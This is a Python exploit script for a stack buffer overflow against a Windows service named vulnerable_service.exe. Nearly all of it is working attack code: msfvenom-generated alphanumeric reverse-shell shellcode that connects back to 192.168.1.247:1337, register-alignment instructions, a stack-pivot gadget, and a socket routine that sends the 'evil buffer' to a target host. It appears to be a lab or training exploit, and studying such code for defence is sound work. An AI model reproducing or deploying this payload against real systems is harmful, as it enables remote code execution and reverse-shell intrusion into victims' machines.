#!/usr/bin/env python3

# Title     : Classic Stack Buffer Overflow with Alphanumeric Shellcode
# Author    : Hashim Jawad (@ihack4falafel)
# Tested on : Windows 10 Build 17763

import socket

#root@kali:~# msfvenom -p windows/shell_reverse_tcp lhost=192.168.1.247 lport=1337 -b "\x00\x0a\0x0d" -e x86/alpha_mixed BufferRegister=EAX -f python -v shellcode
#Payload size: 702 bytes

shellcode =  ""
shellcode += "\x50\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
shellcode += "\x49\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58"
shellcode += "\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42"
shellcode += "\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41"
shellcode += "\x42\x75\x4a\x49\x49\x6c\x69\x78\x6c\x42\x47\x70"
shellcode += "\x33\x30\x65\x50\x61\x70\x6d\x59\x4b\x55\x34\x71"
shellcode += "\x69\x50\x45\x34\x4e\x6b\x42\x70\x46\x50\x6e\x6b"
shellcode += "\x56\x32\x46\x6c\x4c\x4b\x76\x32\x76\x74\x4c\x4b"
shellcode += "\x32\x52\x66\x48\x54\x4f\x6e\x57\x72\x6a\x46\x46"
shellcode += "\x50\x31\x69\x6f\x6e\x4c\x57\x4c\x31\x71\x43\x4c"
shellcode += "\x43\x32\x46\x4c\x37\x50\x6f\x31\x48\x4f\x76\x6d"
shellcode += "\x47\x71\x6a\x67\x4a\x42\x49\x62\x31\x42\x70\x57"
shellcode += "\x4c\x4b\x76\x32\x34\x50\x6c\x4b\x61\x5a\x55\x6c"
shellcode += "\x4c\x4b\x50\x4c\x46\x71\x63\x48\x5a\x43\x37\x38"
shellcode += "\x55\x51\x5a\x71\x72\x71\x6e\x6b\x72\x79\x67\x50"
shellcode += "\x55\x51\x59\x43\x4e\x6b\x70\x49\x32\x38\x4b\x53"
shellcode += "\x67\x4a\x73\x79\x6e\x6b\x76\x54\x6c\x4b\x67\x71"
shellcode += "\x5a\x76\x34\x71\x49\x6f\x4e\x4c\x39\x51\x4a\x6f"
shellcode += "\x66\x6d\x75\x51\x5a\x67\x36\x58\x49\x70\x52\x55"
shellcode += "\x6b\x46\x43\x33\x63\x4d\x6c\x38\x45\x6b\x61\x6d"
shellcode += "\x64\x64\x64\x35\x5a\x44\x32\x78\x6c\x4b\x36\x38"
shellcode += "\x65\x74\x63\x31\x6a\x73\x43\x56\x4e\x6b\x56\x6c"
shellcode += "\x70\x4b\x6c\x4b\x43\x68\x55\x4c\x53\x31\x69\x43"
shellcode += "\x6c\x4b\x45\x54\x4c\x4b\x65\x51\x6a\x70\x6d\x59"
shellcode += "\x52\x64\x54\x64\x67\x54\x31\x4b\x71\x4b\x71\x71"
shellcode += "\x32\x79\x51\x4a\x66\x31\x79\x6f\x59\x70\x53\x6f"
shellcode += "\x73\x6f\x72\x7a\x4c\x4b\x67\x62\x68\x6b\x4e\x6d"
shellcode += "\x73\x6d\x32\x48\x55\x63\x50\x32\x75\x50\x63\x30"
shellcode += "\x72\x48\x73\x47\x70\x73\x55\x62\x51\x4f\x32\x74"
shellcode += "\x70\x68\x32\x6c\x64\x37\x76\x46\x74\x47\x4b\x4f"
shellcode += "\x4a\x75\x58\x38\x4a\x30\x33\x31\x37\x70\x63\x30"
shellcode += "\x55\x79\x6a\x64\x36\x34\x66\x30\x30\x68\x74\x69"
shellcode += "\x4f\x70\x50\x6b\x75\x50\x49\x6f\x7a\x75\x70\x50"
shellcode += "\x70\x50\x52\x70\x76\x30\x63\x70\x36\x30\x33\x70"
shellcode += "\x32\x70\x63\x58\x6b\x5a\x76\x6f\x49\x4f\x39\x70"
shellcode += "\x39\x6f\x38\x55\x4c\x57\x72\x4a\x64\x45\x30\x68"
shellcode += "\x79\x50\x4f\x58\x55\x51\x4c\x37\x52\x48\x75\x52"
shellcode += "\x57\x70\x77\x75\x30\x39\x4c\x49\x79\x76\x62\x4a"
shellcode += "\x76\x70\x36\x36\x56\x37\x32\x48\x6c\x59\x69\x35"
shellcode += "\x64\x34\x55\x31\x39\x6f\x78\x55\x6c\x45\x49\x50"
shellcode += "\x64\x34\x66\x6c\x59\x6f\x72\x6e\x66\x68\x50\x75"
shellcode += "\x48\x6c\x43\x58\x7a\x50\x6d\x65\x4d\x72\x50\x56"
shellcode += "\x39\x6f\x6b\x65\x35\x38\x75\x33\x70\x6d\x51\x74"
shellcode += "\x37\x70\x6e\x69\x68\x63\x70\x57\x61\x47\x43\x67"
shellcode += "\x45\x61\x6a\x56\x51\x7a\x47\x62\x53\x69\x46\x36"
shellcode += "\x59\x72\x79\x6d\x63\x56\x78\x47\x50\x44\x56\x44"
shellcode += "\x45\x6c\x66\x61\x43\x31\x4c\x4d\x53\x74\x64\x64"
shellcode += "\x74\x50\x6f\x36\x47\x70\x50\x44\x50\x54\x50\x50"
shellcode += "\x71\x46\x42\x76\x30\x56\x67\x36\x63\x66\x72\x6e"
shellcode += "\x50\x56\x70\x56\x63\x63\x73\x66\x73\x58\x74\x39"
shellcode += "\x7a\x6c\x77\x4f\x6f\x76\x4b\x4f\x69\x45\x6d\x59"
shellcode += "\x49\x70\x30\x4e\x76\x36\x33\x76\x49\x6f\x44\x70"
shellcode += "\x32\x48\x35\x58\x4e\x67\x35\x4d\x43\x50\x39\x6f"
shellcode += "\x68\x55\x4d\x6b\x48\x70\x4d\x65\x79\x32\x51\x46"
shellcode += "\x52\x48\x6c\x66\x4d\x45\x6f\x4d\x6d\x4d\x4b\x4f"
shellcode += "\x39\x45\x75\x6c\x37\x76\x51\x6c\x57\x7a\x6b\x30"
shellcode += "\x39\x6b\x49\x70\x30\x75\x36\x65\x6f\x4b\x50\x47"
shellcode += "\x52\x33\x33\x42\x42\x4f\x53\x5a\x67\x70\x56\x33"
shellcode += "\x4b\x4f\x68\x55\x41\x41"

# Align EAX to the start of alpha_mixed shellcode (added bonus: this step will also make sure ESP is no where near EIP which typically lead to stack corruption!)
EAXAlign  = "\x54"                     # push esp
EAXAlign += "\x58"                     # pop eax
EAXAlign += "\x05\x01\x11\x11\x11"     # add eax,0x11111101
EAXAlign += "\x05\x11\x12\x11\x11"     # add eax,0x11111211
EAXAlign += "\x2d\x39\x22\x22\x22"     # sub eax,0x22222239

buffer  = EAXAlign
buffer += "\x42" * 200
buffer += shellcode
buffer += "\x41" * (1017-len(shellcode)-200-len(EAXAlign))

# Adjust ESP to point to the start of the buffer we control using the gadget below
buffer += "\x0c\x2f\x47\x10"           # 0x10472f0c : {pivot 20 / 0x14} :  # ADD ESP,10 # POP EBP # RETN    ** [vulnerable_service.exe] SafeSEH **   |  ascii {PAGE_EXECUTE_READ}
buffer += "\x43" * (1024-len(buffer))

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('192.168.1.215', 4444))
	print('[+] Sending %s bytes of evil buffer..' %len(buffer))
	s.send(buffer.encode())        # Limit the number of allowed characters for fun :D
except Exception as e:
	print(e)
